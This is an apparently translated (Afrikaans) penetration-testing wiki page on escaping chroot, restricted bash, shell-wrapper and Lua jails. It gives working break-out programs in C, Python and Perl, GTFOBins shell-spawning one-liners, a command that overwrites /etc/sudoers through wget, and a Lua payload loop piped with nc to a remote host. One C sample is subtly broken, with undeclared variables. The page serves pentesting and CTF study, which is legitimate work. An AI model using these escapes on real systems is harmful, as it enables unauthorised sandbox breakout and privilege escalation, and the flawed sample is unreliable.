# Ontsnap uit Jails

{{#include ../../banners/hacktricks-training.md}}

## **GTFOBins**

**Soek op** [**https://gtfobins.github.io/**](https://gtfobins.github.io) **of jy enige binary met die "Shell"-eienskap kan uitvoer**

## Chroot Escapes

Volgens [wikipedia](https://en.wikipedia.org/wiki/Chroot#Limitations): Die chroot-meganisme is **nie bedoel om te verdedig** teen opsetlike peutery deur **bevoorregte** (**root**) **gebruikers** nie. Op die meeste stelsels stapel chroot-kontekste nie behoorlik nie, en chroot-programme **met voldoende privileges kan ’n tweede chroot uitvoer om uit te breek**.\
Gewoonlik beteken dit dat jy root binne die chroot moet wees om te ontsnap.

> [!TIP]
> Die **tool** [**chw00t**](https://github.com/earthquake/chw00t) is geskep om die volgende scenario's te misbruik en uit `chroot` te ontsnap.

### Root + CWD

> [!WARNING]
> As jy **root** binne ’n chroot is, **kan jy ontsnap** deur **nog ’n chroot** te skep. Dit is omdat 2 chroots nie (in Linux) kan saambestaan nie; as jy dus ’n gids skep en dan ’n **nuwe chroot** op daardie nuwe gids **skep terwyl jy buite dit is**, sal jy nou **buite die nuwe chroot** wees en dus in die FS wees.
>
> Dit gebeur omdat chroot gewoonlik NIE jou werkgids na die aangeduide een verskuif nie; jy kan dus ’n chroot skep, maar buite dit bly.

Gewoonlik sal jy nie die `chroot`-binary binne ’n chroot jail vind nie, maar jy **kan ’n binary compile, oplaai en uitvoer**:

<details>

<summary>C: break_chroot.c</summary>
```c
#include <sys/stat.h>
#include <stdlib.h>
#include <unistd.h>

//gcc break_chroot.c -o break_chroot

int main(void)
{
mkdir("chroot-dir", 0755);
chroot("chroot-dir");
for(int i = 0; i < 1000; i++) {
chdir("..");
}
chroot(".");
system("/bin/bash");
}
```
</details>

<details>

<summary>Python</summary>
```python
#!/usr/bin/python
import os
os.mkdir("chroot-dir")
os.chroot("chroot-dir")
for i in range(1000):
os.chdir("..")
os.chroot(".")
os.system("/bin/bash")
```
</details>

<details>

<summary>Perl</summary>
```perl
#!/usr/bin/perl
mkdir "chroot-dir";
chroot "chroot-dir";
foreach my $i (0..1000) {
chdir ".."
}
chroot ".";
system("/bin/bash");
```
</details>

### Root + Gestoorde fd

> [!WARNING]
> Dit is soortgelyk aan die vorige geval, maar in hierdie geval **stoor die aanvaller ’n lêerbeskrywer na die huidige gids** en **skep hy die chroot in ’n nuwe vouer**. Uiteindelik, aangesien hy **toegang** tot daardie **FD** **buite** die chroot het, kry hy toegang daartoe en **ontsnap hy**.

<details>

<summary>C: break_chroot.c</summary>
```c
#include <sys/stat.h>
#include <stdlib.h>
#include <unistd.h>

//gcc break_chroot.c -o break_chroot

int main(void)
{
mkdir("tmpdir", 0755);
dir_fd = open(".", O_RDONLY);
if(chroot("tmpdir")){
perror("chroot");
}
fchdir(dir_fd);
close(dir_fd);
for(x = 0; x < 1000; x++) chdir("..");
chroot(".");
}
```
</details>

### Root + Fork + UDS (Unix Domain Sockets)

> [!WARNING]
> FD kan oor Unix Domain Sockets gestuur word, dus:
>
> - Skep 'n child process (fork)
> - Skep UDS sodat parent en child met mekaar kan kommunikeer
> - Voer chroot in die child process in 'n ander gids uit
> - Skep in die parent proc 'n FD van 'n gids wat buite die nuwe child proc se chroot is
> - Stuur daardie FD met die UDS na die child proc
> - Die child process doen chdir na daardie FD, en omdat dit buite sy chroot is, sal dit uit die jail ontsnap

### Root + Mount

> [!WARNING]
>
> - Mount die root device (/) in 'n gids binne die chroot
> - Chroot na daardie gids
>
> Dit is moontlik in Linux

### Root + /proc

> [!WARNING]
>
> - Mount procfs in 'n gids binne die chroot (indien dit nog nie daar is nie)
> - Soek 'n pid wat 'n ander root/cwd-entry het, byvoorbeeld: /proc/1/root
> - Chroot na daardie entry

### Root(?) + Fork

> [!WARNING]
>
> - Skep 'n Fork (child proc), doen chroot na 'n ander gids dieper in die FS en CD daarin
> - Skuif die gids waarin die child process is vanuit die parent process na 'n gids voor die child se chroot
> - Hierdie child process sal homself buite die chroot vind

### ptrace

> [!WARNING]
>
> - Voorheen kon gebruikers hul eie prosesse vanuit 'n proses van hulself debug ... maar dit is nie meer by verstek moontlik nie
> - Indien dit egter moontlik is, kan jy ptrace na 'n proses uitvoer en shellcode daarin uitvoer ([sien hierdie voorbeeld](../interesting-files-permissions/linux-capabilities.md#cap_sys_ptrace)).

## Bash Jails

### Enumerasie

Kry inligting oor die jail:
```bash
echo $0
echo $SHELL
echo $PATH
env
export
pwd
set -o
compgen -c | sort -u
enable -a
type -a bash sh rbash ssh vi vim less more man awk find tar zip git scp script 2>/dev/null
```
### Wysig PATH

Kyk of jy die PATH-omgewingsveranderlike kan wysig
```bash
echo $PATH #See the path of the executables that you can use
PATH=/usr/local/sbin:/usr/sbin:/sbin:/usr/local/bin:/usr/bin:/bin #Try to change the path
echo /home/* #List directory
```
### Gebruik vim
```bash
:set shell=/bin/sh
:shell
```
### Pagers en help viewers

Baie beperkte omgewings laat steeds **pagers** of **help viewers** beskikbaar. Dit is gewoonlik vinniger om te abuse as om `PATH` te probeer herbou.
```bash
less /etc/hosts
!/bin/sh

man man
!/bin/sh

man '-H/bin/sh #' man
```
As `git` beskikbaar is, onthou dat die hulpuitset daarvan gewoonlik deur ’n pager gaan:
```bash
PAGER='/bin/sh -c "exec sh 0<&1"' git -p help
# Or: git help config
# Then inside the pager: !/bin/sh
```
### Algemene GTFOBins one-liners

Sodra jy weet watter binaries bereikbaar is, toets eers die ooglopende shell-spawners:
```bash
awk 'BEGIN {system("/bin/sh")}'
find . -exec /bin/sh \; -quit
tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/sh
zip /tmp/zip.zip /etc/hosts -T --unzip-command='sh -c /bin/sh'
script /dev/null -c bash
ssh localhost /bin/sh
```
As jy slegs **arguments kan inject** in ’n toegelate command (in plaas daarvan om dit vrylik uit te voer), kyk ook na **GTFOArgs**.

### Skep script

Kontroleer of jy ’n uitvoerbare lêer met _/bin/bash_ as inhoud kan skep
```bash
red /bin/bash
> w wx/path #Write /bin/bash in a writable and executable path
```
### Kry bash via SSH

As jy toegang via ssh verkry, kan jy dikwels die bediener vra om ’n **ander program** in plaas van die beperkte aanmelddop uit te voer:
```bash
ssh -t user@<IP> bash # Get directly an interactive shell
ssh user@<IP> -t "/bin/sh"
ssh user@<IP> -t "bash --noprofile -i"
ssh user@<IP> -t "() { :; }; sh -i "
```
As `ssh` een van die min plaaslik toegelate binaries is, onthou dat dit ook as ’n **GTFOBin** misbruik kan word:
```bash
ssh localhost /bin/sh
ssh -o PermitLocalCommand=yes -o LocalCommand=/bin/sh localhost
ssh -o ProxyCommand=';/bin/sh 0<&2 1>&2' x
```
### Verklaar
```bash
declare -n PATH; export PATH=/bin;bash -i

BASH_CMDS[shell]=/bin/bash;shell -i
```
### Wget

Jy kan byvoorbeeld die sudoers-lêer oorskryf
```bash
wget http://127.0.0.1:8080/sudoers -O /etc/sudoers
```
### Beperkte shell wrappers (`git-shell`, `rssh`, `lshell`)

Sommige omgewings plaas jou nie in gewone `rbash` nie, maar in **wrappers** soos `git-shell`, `rssh` of `lshell`:

- `git-shell` aanvaar slegs Git-bedieneropdragte plus enigiets wat binne `~/git-shell-commands/` teenwoordig is. As daardie gids bestaan, voer `help` uit om die toegelate pasgemaakte aksies op te som. As jy daarheen kan **skryf**, word enige executable wat in daardie gids geplaas word, bereikbaar.
- `rssh` / `lshell` laat gewoonlik slegs `scp`, `sftp`, `rsync` of Git-stylbewerkings toe. Fokus in daardie gevalle eers op **file write primitives**: laai `authorized_keys`, ’n shell startup file of ’n helper script na ’n skryfbare ligging op en koppel dan weer met `ssh -t ...`.
- As die wrapper slegs die command line filter, som die bereikbare binaries op en pivot dan terug na **GTFOBins / GTFOArgs**.

### Ander truuks

Kyk ook na:

- [**Fireshell Security - Restricted Linux Shell Escaping Techniques**](https://fireshellsecurity.team/restricted-linux-shell-escaping-techniques/)
- [**SANS - Escaping Restricted Linux Shells**](https://www.sans.org/blog/escaping-restricted-linux-shells)
- [**GTFOBins**](https://gtfobins.org/)
- [**GTFOArgs**](https://gtfoargs.github.io/)

**Die volgende bladsy kan ook interessant wees:**

{{#ref}}
../linux-basics/bypass-linux-restrictions/
{{#endref}}

## Python Jails

Truuks oor escaping uit Python-jails kan op die volgende bladsy gevind word:


{{#ref}}
../../generic-methodologies-and-resources/python/bypass-python-sandboxes/
{{#endref}}

## Lua Jails

Op hierdie bladsy kan jy die globale funksies vind waartoe jy binne Lua toegang het: [https://www.gammon.com.au/scripts/doc.php?general=lua_base](https://www.gammon.com.au/scripts/doc.php?general=lua_base)

**Eval met command execution:**
```bash
load(string.char(0x6f,0x73,0x2e,0x65,0x78,0x65,0x63,0x75,0x74,0x65,0x28,0x27,0x6c,0x73,0x27,0x29))()
```
Enkele truuks om funksies van ’n biblioteek aan te roep sonder om punte te gebruik:
```bash
print(string.char(0x41, 0x42))
print(rawget(string, "char")(0x41, 0x42))
```
Enumereer funksies van ’n biblioteek:
```bash
for k,v in pairs(string) do print(k,v) end
```
Let daarop dat elke keer wanneer jy die vorige **one liner** in ’n **ander lua environment** uitvoer, die volgorde van die functions verander. Daarom, indien jy een spesifieke function moet uitvoer, kan jy ’n brute force attack uitvoer deur verskillende lua environments te laai en die eerste function van die le library aan te roep:
```bash
#In this scenario you could BF the victim that is generating a new lua environment
#for every interaction with the following line and when you are lucky
#the char function is going to be executed
for k,chr in pairs(string) do print(chr(0x6f,0x73,0x2e,0x65,0x78)) end

#This attack from a CTF can be used to try to chain the function execute from "os" library
#and "char" from string library, and the use both to execute a command
for i in seq 1000; do echo "for k1,chr in pairs(string) do for k2,exec in pairs(os) do print(k1,k2) print(exec(chr(0x6f,0x73,0x2e,0x65,0x78,0x65,0x63,0x75,0x74,0x65,0x28,0x27,0x6c,0x73,0x27,0x29))) break end break end" | nc 10.10.10.10 10006 | grep -A5 "Code: char"; done
```
**Kry interaktiewe lua shell**: As jy binne ’n beperkte lua shell is, kan jy ’n nuwe lua shell (en hopelik onbeperkte een) kry deur die volgende aan te roep:
```bash
debug.debug()
```
## Verwysings

- [https://www.youtube.com/watch?v=UO618TeyCWo](https://www.youtube.com/watch?v=UO618TeyCWo) (Skyfies: [https://deepsec.net/docs/Slides/2015/Chw00t_How_To_Break%20Out_from_Various_Chroot_Solutions\_-_Bucsay_Balazs.pdf](https://deepsec.net/docs/Slides/2015/Chw00t_How_To_Break%20Out_from_Various_Chroot_Solutions_-_Bucsay_Balazs.pdf))
- [https://www.gnu.org/software/bash/manual/html_node/The-Restricted-Shell.html](https://www.gnu.org/software/bash/manual/html_node/The-Restricted-Shell.html)
- [https://git-scm.com/docs/git-shell](https://git-scm.com/docs/git-shell)

{{#include ../../banners/hacktricks-training.md}}
